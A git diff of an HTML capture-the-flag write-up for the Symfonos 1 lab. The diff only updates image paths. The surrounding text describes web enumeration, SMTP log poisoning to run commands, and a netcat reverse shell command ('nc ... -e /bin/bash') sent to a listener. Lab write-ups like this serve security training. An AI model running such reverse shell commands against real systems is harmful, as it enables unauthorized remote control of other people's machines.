@@ -200,7 +200,7 @@ getting file \todo.txt of size 52 as todo.txt (520000.0 KiloBytes/sec) (average 
 
     <h2>Port 80</h2>
 
-    <img src="symfonos_1/port80.png">
+    <img src="../images/symfonos_1/port80.png">
 
     <li>This page only shows a picture.  Initially we run gobuster to see if there are any interesting directories.</li>
 
@@ -234,7 +234,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 
     <li>Initially I get a barebones wordpress page like this</li>
 
-    <img src="symfonos_1/port80_helios.png">
+    <img src="../images/symfonos_1/port80_helios.png">
 
     <p>Being familiar with wordpress, I know if we can get access to the admin portal we can likely get a reverse shell.  So we go to the bottom of the page and click on "Log in".  However, we just get a message that says the page cannot be found.  If we look at where "Log in" points to, we see it is pointing to symfonos.local.  We should add a line to our /etc/hosts file to account for this virtual host routing.</p>
 
@@ -449,7 +449,7 @@ Connection closed by foreign host.
 
     <p>There is a lot of output on this page, but towards the end we see our email.  Right after the word "Subject:" we can see our commands being executed.</p>
 
-    <img src="symfonos_1/smtp_poisoned.png">
+    <img src="../images/symfonos_1/smtp_poisoned.png">
 
     <p>Now I set my listener on port 80 and use netcat for a reverse shell.</p>
     <li>nc 10.0.0.1 80 -e /bin/bash</li>
